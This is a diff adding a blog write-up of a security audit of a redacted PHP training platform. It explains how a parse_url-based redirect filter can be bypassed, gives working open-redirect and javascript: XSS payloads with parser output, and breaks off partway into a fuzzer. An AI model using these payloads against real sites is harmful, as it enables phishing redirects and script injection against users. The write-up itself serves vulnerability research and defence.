+    class="block py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
+    Table of Contents
+  </summary>
+  <div
+    class="min-w-[220px] py-2 border-dotted ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#source--sink">Source &amp; Sink</a></li>
+    <li><a href="#sanitizerfilter">Sanitizer/Filter</a></li>
+    <li><a href="#bypass-the-host-check">Bypass the host check</a></li>
+    <li><a href="#bypass-scheme-check">Bypass scheme check</a></li>
+    <li><a href="#further-research">Further Research</a>
+      <ul>
+        <li><a href="#qustion1-httpcharlocalhost80xxxx">Qustion1: http:{char}//localhost:80/xxxx</a></li>
+        <li><a href="#question2-httpcharlocalhost80xxxx">Question2: http{char}://localhost:80/xxxx</a></li>
+        <li><a href="#question3-charhttplocalhost80xxxx">Question3: {char}http://localhost:80/xxxx</a></li>
+        <li><a href="#question4-htchartplocalhost80xxxx">Question4: ht{char}tp://localhost:80/xxxx</a></li>
+        <li><a href="#summary">Summary</a></li>
+      </ul>
+    </li>
+    <li><a href="#the-root-cause">The root cause</a></li>
+    <li><a href="#summary-1">Summary</a></li>
+    <li><a href="#keep-in-touch">Keep in touch</a></li>
+    <li><a href="#reference">Reference</a></li>
+  </ul>
+</nav>
+  </div>
+</details>
+<details class="toc-inside mt-0 overflow-hidden rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 lg:hidden">
+  <summary
+    class="py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
+    Table of Contents
+  </summary>
+  <div
+    class="py-2 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#source--sink">Source &amp; Sink</a></li>
+    <li><a href="#sanitizerfilter">Sanitizer/Filter</a></li>
+    <li><a href="#bypass-the-host-check">Bypass the host check</a></li>
+    <li><a href="#bypass-scheme-check">Bypass scheme check</a></li>
+    <li><a href="#further-research">Further Research</a>
+      <ul>
+        <li><a href="#qustion1-httpcharlocalhost80xxxx">Qustion1: http:{char}//localhost:80/xxxx</a></li>
+        <li><a href="#question2-httpcharlocalhost80xxxx">Question2: http{char}://localhost:80/xxxx</a></li>
+        <li><a href="#question3-charhttplocalhost80xxxx">Question3: {char}http://localhost:80/xxxx</a></li>
+        <li><a href="#question4-htchartplocalhost80xxxx">Question4: ht{char}tp://localhost:80/xxxx</a></li>
+        <li><a href="#summary">Summary</a></li>
+      </ul>
+    </li>
+    <li><a href="#the-root-cause">The root cause</a></li>
+    <li><a href="#summary-1">Summary</a></li>
+    <li><a href="#keep-in-touch">Keep in touch</a></li>
+    <li><a href="#reference">Reference</a></li>
+  </ul>
+</nav>
+  </div>
+</details>
+
+<script>
+
+  var margin = 200;
+  var marginError = 50;
+
+  (function () {
+    var $window = $(window);
+    var $toc = $('#TOCView');
+    var tocHeight = $toc.height();
+
+    function onResize() {
+      var windowAndMarginHeight = $window.height() - margin;
+      if(tocHeight >= windowAndMarginHeight) {
+        $toc.css("overflow-y", "scroll")
+        $toc.css("max-height", (windowAndMarginHeight + marginError) + "px")
+      } else {
+        $toc.css("overflow-y", "hidden")
+        $toc.css("max-height", "9999999px")
+      }
+    }
+
+    $window.on('resize', onResize);
+    $(document).ready(onResize);
+  })();
+
+
+
+</script>
+   </div>
+      </div>
+      
+
+      <div class="min-w-0 min-h-0 max-w-fit">
+        
+        
+
+
+        <div class="article-content max-w-prose mb-20">
+          <p>In August 2022, when digging the <a href="https://src.topsec.com.cn/" target="_blank">SRC of Tianrongxin</a>, I found that <a href="https://github.com/redacted/redacted" target="_blank">redacted</a> teaching and training system was used in a site of Tianrongxin Education, so I downloaded the source code of redacted on github and audited it.</p>
+
+
+<h2 class="relative group">Source &amp; Sink 
+    <div id="source--sink" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#source--sink" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+<p>According to the audit, redacted Education and training system uses goto parameter in many places to achieve page redirection, such as login function:</p>
+<pre tabindex="0"><code>http://demo.redacted.com/login?goto=/
+</code></pre><p>If a logged-in user accesses this URL, the back-end reads the value of the <code>goto</code> parameter and fills it into the custom property <code>data-goto</code> of the div tag in the twig template:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl">{% block content %}
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;page-message-container&#34;</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;page-message-container&#34;</span> <span class="na">data-goto</span><span class="o">=</span><span class="s">&#34;{{ goto }}&#34;</span> <span class="na">data-duration</span><span class="o">=</span><span class="s">{{</span> <span class="na">duration</span> <span class="err">}}</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;page-message-panel&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;page-message-heading&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">h2</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;page-message-title&#34;</span><span class="p">&gt;</span>{{ title|trans }}<span class="p">&lt;/</span><span class="nt">h2</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;page-message-body&#34;</span><span class="p">&gt;</span>{{ message|default(&#39;&#39;)|trans|raw }}<span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">{% endblock %}
+</span></span></code></pre></div><p>Then, the front-end reads the value of <code>data-goto</code> property through the following js code, and jumps to the page through <code>window.location.href</code> :</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kd">function</span> <span class="p">(</span><span class="nx">e</span><span class="p">,</span> <span class="nx">t</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">n</span> <span class="o">=</span> <span class="nx">$</span><span class="p">(</span><span class="s2">&#34;#page-message-container&#34;</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl"><span class="nx">r</span> <span class="o">=</span> <span class="nx">n</span><span class="p">.</span><span class="nx">data</span><span class="p">(</span><span class="s2">&#34;goto&#34;</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl"><span class="nx">o</span> <span class="o">=</span> <span class="nx">n</span><span class="p">.</span><span class="nx">data</span><span class="p">(</span><span class="s2">&#34;duration&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">o</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="nx">r</span> <span class="o">&amp;&amp;</span> <span class="nx">setTimeout</span><span class="p">((</span><span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl"><span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span> <span class="o">=</span> <span class="nx">r</span>
+</span></span><span class="line"><span class="cl"><span class="p">}),</span> <span class="nx">o</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div>
+
+<h2 class="relative group">Sanitizer/Filter 
+    <div id="sanitizerfilter" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#sanitizerfilter" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+<p>In order to prevent the occurrence of open redirection vulnerability (OR) and XSS in the process of page redirection, redacted specially writes a <a href="https://github.com/redacted/redacted/blob/ffcb9cad8c6097d6d734ca3caf27e2e09dce9660/src/AppBundle/Controller/BaseController.php#L375-L388" target="_blank">filter</a> on the back end to filter the URL in the <code>goto</code> parameter:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">/</span> <span class="o">*</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="o">*</span> <span class="nx">Filter</span> <span class="nx">urls</span><span class="o">.</span>
+</span></span><span class="line"><span class="cl"><span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="o">*</span> <span class="k">If</span> <span class="nx">the</span> <span class="nx">url</span> <span class="nx">does</span> <span class="k">not</span> <span class="nx">belong</span> <span class="nx">to</span> <span class="nx">a</span> <span class="nx">domain</span> <span class="nx">name</span> <span class="nx">other</span> <span class="nx">than</span> <span class="k">this</span> <span class="nx">site</span><span class="p">,</span> <span class="k">return</span> <span class="nx">to</span> <span class="nx">the</span> <span class="nx">home</span> <span class="nx">address</span> <span class="nx">of</span> <span class="k">this</span> <span class="nx">site</span><span class="o">.</span>
+</span></span><span class="line"><span class="cl"><span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="o">*</span> <span class="o">@</span><span class="nx">param</span> <span class="nv">$url</span> <span class="nx">string</span> <span class="nv">$url</span> <span class="nx">to</span> <span class="nx">be</span> <span class="nx">filtered</span>
+</span></span><span class="line"><span class="cl"><span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="o">*</span> <span class="o">@</span><span class="k">return</span> <span class="nx">string</span>
+</span></span><span class="line"><span class="cl"><span class="o">*</span> <span class="o">/</span>
+</span></span><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="nf">filterRedirectUrl</span><span class="p">(</span><span class="nv">$url</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$host</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">get</span><span class="p">(</span><span class="s1">&#39;request_stack&#39;</span><span class="p">)</span><span class="o">-&gt;</span><span class="na">getCurrentRequest</span><span class="p">()</span><span class="o">-&gt;</span><span class="na">getHost</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$safeHosts</span> <span class="o">=</span> <span class="p">[</span><span class="nv">$host</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$parsedUrl</span> <span class="o">=</span> <span class="nx">parse_url</span><span class="p">(</span><span class="nv">$url</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$isUnsafeHost</span> <span class="o">=</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$parsedUrl</span><span class="p">[</span><span class="s1">&#39;host&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="o">!</span> <span class="nx">in_array</span><span class="p">(</span><span class="nv">$parsedUrl</span><span class="p">[</span><span class="s1">&#39;host&#39;</span><span class="p">],</span> <span class="nv">$safeHosts</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$isInvalidUrl</span> <span class="o">=</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$parsedUrl</span><span class="p">[</span><span class="s1">&#39;scheme&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="o">!</span> <span class="nx">in_array</span><span class="p">(</span><span class="nv">$parsedUrl</span><span class="p">[</span><span class="s1">&#39;scheme&#39;</span><span class="p">],</span> <span class="p">[</span><span class="s1">&#39;http&#39;</span><span class="p">,</span> <span class="s1">&#39;https&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$url</span><span class="p">)</span> <span class="o">||</span> <span class="nv">$isUnsafeHost</span> <span class="o">||</span> <span class="nv">$isInvalidUrl</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$url</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">generateUrl</span><span class="p">(</span><span class="s1">&#39;homepage&#39;</span><span class="p">,</span> <span class="p">[],</span> <span class="nx">UrlGeneratorInterface</span><span class="o">::</span><span class="na">ABSOLUTE_URL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">return</span> <span class="nx">strip_tags</span><span class="p">(</span><span class="nv">$url</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>The filter works as follows:</p>
+<ol>
+<li>Obtain the Host header in the http request packet and use it as the host whitelist</li>
+<li>Set protocol whitelists to http and https</li>
+<li>Use PHP&rsquo;s URL parser to parse the incoming URL and get the host part and scheme part</li>
+<li>If the host part and the scheme part exist, check whether the host part belongs to the host whitelist and the scheme part belongs to the scheme whitelist</li>
+<li>Otherwise, it is assumed that the user passed in a relative URL</li>
+</ol>
+
+
+<h2 class="relative group">Bypass the host check 
+    <div id="bypass-the-host-check" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#bypass-the-host-check" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+<p>How do I bypass filter&rsquo;s host check? The following payload comes to mind:</p>
+<pre tabindex="0"><code>https://demo.redacted.com/login?goto=http://baidu.com\@demo.redacted.com/
+</code></pre><p>The payload works because of the inconsistency between the front-end and back-end URL parsers:</p>
+<ul>
+<li><code>parse_url</code> of PHP considers the host part of the URL to be demo.redacted.com, which is the same as the Host request in the http request packet. Therefore, the check is passed.</li>
+<li>But the javascript URL parser doesn&rsquo;t think so: the js URL parser normalizes \ to /, so the payload is normalized into the following URL:</li>
+</ul>
+<pre tabindex="0"><code>http://baidu.com/@demo.redacted.com/
+</code></pre><p>Therefore, the front-end considers the host part of the URL to be baidu.com.</p>
+<p>PHP URL parser:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">php</span> <span class="o">-</span><span class="nx">r</span> <span class="s2">&#34;var_dump(parse_url(&#39;http://baidu.com\@demo.redacted.com/&#39;));&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nx">Command</span> <span class="nx">line</span> <span class="nx">code</span><span class="o">:</span><span class="mi">1</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl"><span class="k">array</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="s1">&#39;scheme&#39;</span> <span class="o">=&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">string</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span> <span class="s2">&#34;http&#34;</span>
+</span></span><span class="line"><span class="cl">  <span class="s1">&#39;host&#39;</span> <span class="o">=&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">string</span><span class="p">(</span><span class="mi">16</span><span class="p">)</span> <span class="s2">&#34;demo.redacted.com&#34;</span>
+</span></span><span class="line"><span class="cl">  <span class="s1">&#39;user&#39;</span> <span class="o">=&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">string</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span> <span class="s2">&#34;baidu.com</span><span class="se">\&#34;</span><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">  &#39;path&#39; =&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">  string(1) &#34;</span><span class="o">/</span><span class="s2">&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s2">}
+</span></span></span></code></pre></div><p>Javascript URL parser:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="o">&gt;</span> <span class="k">new</span> <span class="nx">URL</span><span class="p">(</span><span class="s1">&#39;http://baidu.com\\@demo.redacted.com/&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nx">URL</span> <span class="p">{</span><span class="nx">origin</span><span class="o">:</span> <span class="s1">&#39;http://baidu.com&#39;</span><span class="p">,</span> <span class="nx">protocol</span><span class="o">:</span> <span class="s1">&#39;http:&#39;</span><span class="p">,</span> <span class="nx">username</span><span class="o">:</span> <span class="s1">&#39;, password: &#39;</span><span class="p">,</span> <span class="nx">host</span><span class="o">:</span> <span class="s1">&#39;baidu.com&#39;</span><span class="p">,...</span> <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="nx">hash</span><span class="o">:</span> <span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nx">host</span><span class="o">:</span> <span class="s2">&#34;baidu.com&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nx">hostname</span><span class="o">:</span> <span class="s2">&#34;baidu.com&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nx">href</span><span class="o">:</span> <span class="s2">&#34;http://baidu.com/@demo.redacted.com/&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nx">origin</span><span class="o">:</span> <span class="s2">&#34;http://baidu.com&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nx">password</span><span class="o">:</span> <span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nx">pathname</span><span class="o">:</span> <span class="s2">&#34;/@demo.redacted.com/&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nx">port</span><span class="o">:</span> <span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nx">protocol</span><span class="o">:</span> <span class="s2">&#34;http:&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nx">search</span><span class="o">:</span> <span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nx">searchParams</span><span class="o">:</span> <span class="nx">URLSearchParams</span> <span class="p">{}</span>
+</span></span><span class="line"><span class="cl"><span class="nx">username</span><span class="o">:</span> <span class="s2">&#34;&#34;</span>
+</span></span></code></pre></div><p>A point of note when <code>\</code> is the js escape symbol, such as: hexadecimal encoding <code>\x61</code>, and control character encoding <code>\n</code>&hellip;</p>
+<p>So it&rsquo;s escaped again in the demo code above</p>
+
+
+<h2 class="relative group">Bypass scheme check 
+    <div id="bypass-scheme-check" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#bypass-scheme-check" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+<p>By simply bypassing host checking, we can only create an open redirection vulnerability. To cause xss, we also need to bypass protocol checking on the back end. How do we bypass protocol checking on the back end?</p>
+<p>We can try to start with the following idea: since vulnerability are often due to some false assumptions of the program, we can try to find out what false assumptions filter has, and then try to break it.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$parsedUrl</span> <span class="o">=</span> <span class="nx">parse_url</span><span class="p">(</span><span class="nv">$url</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$isUnsafeHost</span> <span class="o">=</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$parsedUrl</span><span class="p">[</span><span class="s1">&#39;host&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="o">!</span> <span class="nx">in_array</span><span class="p">(</span><span class="nv">$parsedUrl</span><span class="p">[</span><span class="s1">&#39;host&#39;</span><span class="p">],</span> <span class="nv">$safeHosts</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$isInvalidUrl</span> <span class="o">=</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$parsedUrl</span><span class="p">[</span><span class="s1">&#39;scheme&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="o">!</span> <span class="nx">in_array</span><span class="p">(</span><span class="nv">$parsedUrl</span><span class="p">[</span><span class="s1">&#39;scheme&#39;</span><span class="p">],</span> <span class="p">[</span><span class="s1">&#39;http&#39;</span><span class="p">,</span> <span class="s1">&#39;https&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$url</span><span class="p">)</span> <span class="o">||</span> <span class="nv">$isUnsafeHost</span> <span class="o">||</span> <span class="nv">$isInvalidUrl</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$url</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">generateUrl</span><span class="p">(</span><span class="s1">&#39;homepage&#39;</span><span class="p">,</span> <span class="p">[],</span> <span class="nx">UrlGeneratorInterface</span><span class="o">::</span><span class="na">ABSOLUTE_URL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">return</span> <span class="nx">strip_tags</span><span class="p">(</span><span class="nv">$url</span><span class="p">);</span>
+</span></span></code></pre></div><p>Looking back at the filter code above, filter assumes:</p>
+<ol>
+<li>If the host and scheme parts cannot be resolved from the URL, it must be a relative URL</li>
+<li><code>Relative URL</code> must be secure.</li>
+</ol>
+<p>So what happens if we make parse_url return <code>false</code>?</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">false</span><span class="p">[</span><span class="s1">&#39;host&#39;</span><span class="p">]</span> <span class="o">===</span> <span class="k">NULL</span>
+</span></span><span class="line"><span class="cl"><span class="k">false</span><span class="p">[</span><span class="s1">&#39;scheme&#39;</span><span class="p">]</span> <span class="o">===</span> <span class="k">NULL</span>
+</span></span></code></pre></div><p><code>parse_url</code> will assume that the URL passed in by the user has no host and scheme parts, so it&rsquo;s a relative URL! Relative urls must be safe and can be returned directly to the front end.</p>
+<p>How do we make <code>parse_url</code> return <code>false</code>?</p>
+<p>The PHP URL parser is just an implementation of the RFC standard, so if the URL passed in does not conform to the RFC specification, then the <code>parse_url</code> will return false</p>
+<p>A classic payload, for example, is a much simpler way to cause open redirects:</p>
+<pre tabindex="0"><code>https://demo.redacted.com/login?goto=http:///baidu.com
+</code></pre><p><a href="https://www.rfc-editor.org/rfc/rfc1738" target="_blank">RFC 1738</a> states that the absolute URL of the hierarchy must exclude the protocol part and subsequent parts must begin with //</p>
+<blockquote>
+<p>The scheme specific data start with a double slash &ldquo;//&rdquo; to indicate that it complies with the common Internet scheme syntax.</p>
+</blockquote>
+<p>So PHP&rsquo;s URL parser thinks that <code>http:///baidu.com</code> is an illegal URL, so it simply returns <code>false</code>, bypassing the follow-up check and returning it to the front end.</p>
+<p>But the front-end URL parser doesn&rsquo;t think so, and normalizes <code>http:///baidu.com</code> to <code>http://baidu.com</code>:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="o">&gt;</span> <span class="k">new</span> <span class="nx">URL</span><span class="p">(</span><span class="s1">&#39;http:///baidu.com&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nx">URL</span> <span class="p">{</span><span class="nx">origin</span><span class="o">:</span> <span class="s1">&#39;http://baidu.com&#39;</span><span class="p">,</span> <span class="nx">protocol</span><span class="o">:</span> <span class="s1">&#39;http:&#39;</span><span class="p">,</span> <span class="nx">username</span><span class="o">:</span> <span class="s1">&#39;, password: &#39;</span><span class="p">,</span> <span class="nx">host</span><span class="o">:</span> <span class="s1">&#39;baidu.com&#39;</span><span class="p">,...</span> <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="nx">hash</span><span class="o">:</span> <span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nx">host</span><span class="o">:</span> <span class="s2">&#34;baidu.com&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nx">hostname</span><span class="o">:</span> <span class="s2">&#34;baidu.com&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nx">href</span><span class="o">:</span> <span class="s2">&#34;http://baidu.com/&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nx">origin</span><span class="o">:</span> <span class="s2">&#34;http://baidu.com&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nx">password</span><span class="o">:</span> <span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nx">pathname</span><span class="o">:</span> <span class="s2">&#34;/&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nx">port</span><span class="o">:</span> <span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nx">protocol</span><span class="o">:</span> <span class="s2">&#34;http:&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nx">search</span><span class="o">:</span> <span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nx">searchParams</span><span class="o">:</span> <span class="nx">URLSearchParams</span> <span class="p">{}</span>
+</span></span><span class="line"><span class="cl"><span class="nx">username</span><span class="o">:</span> <span class="s2">&#34;&#34;</span>
+</span></span></code></pre></div><p>So there is an OR vulnerability.</p>
+<p>What about swapping <code>http</code> for <code>javascript</code>? The RFC document only specifies that hierarchical urls must contain the &lsquo;//&rsquo; prefix, but does not specify what should the URL parser do if a non-hierarchical URL contains a &lsquo;//&rsquo; prefix</p>
+<p>for example:</p>
+<pre tabindex="0"><code>javascript:alert(1) ---&gt; javascript://alert(1)
+mailto:happyhacking@qq.com ---&gt; mailto://happyhacking@qq.com
+</code></pre><p>So I thought of payload:</p>
+<pre tabindex="0"><code>https://demo.redacted.com/login?goto=javascript:///%250dalert(1)
+</code></pre><p>PHP&rsquo;s URL parser considers <code>javascript:///%250dalert(1)</code> to be an illegal URL and returns <code>false</code>, so filter skips protocol checking and simply considers it to be a safe <code>relative URL</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">php -r <span class="s2">&#34;var_dump(parse_url(&#39;javascript:///%250dalert(1)&#39;));&#34;</span>        
+</span></span><span class="line"><span class="cl">Command line code:1:
+</span></span><span class="line"><span class="cl">bool<span class="o">(</span><span class="nb">false</span><span class="o">)</span>
+</span></span></code></pre></div><p>But the front-end URL parser has its own ideas:</p>
+<p>The payload reflected to the front looks like this:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span> <span class="o">=</span> <span class="s1">&#39;javascript:///%0dalert(1)&#39;</span>
+</span></span></code></pre></div><p>The front-end URL parser decodes the URL first, decoding &lsquo;%0d&rsquo; into &lsquo;\n&rsquo;, and the protocol parsed into is named javascript, so it switches to the js resolver, which thinks&rsquo; // &lsquo;is a single line comment, <code>alert(1)</code> is the next line of js code after the newline.</p>
+<p>So we have a XSS vulnerability!</p>
+
+
+<h2 class="relative group">Further Research 
+    <div id="further-research" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#further-research" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+<p>Can we further search for more inconsistencies between the js URL parser and the php URL parser by writing fuzzer?</p>
+
+
+<h3 class="relative group">Qustion1: http:{char}//localhost:80/xxxx 
+    <div id="qustion1-httpcharlocalhost80xxxx" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#qustion1-httpcharlocalhost80xxxx" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p>Can we find a character between <code>http:</code> and <code>//</code> that the front-end URL parser still considers the host part of the URL to be localhost after we fill it into the <code>{char}</code> position?</p>
+<p>So I wrote the following fuzzer:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nx">log</span><span class="o">=</span><span class="p">[];</span>
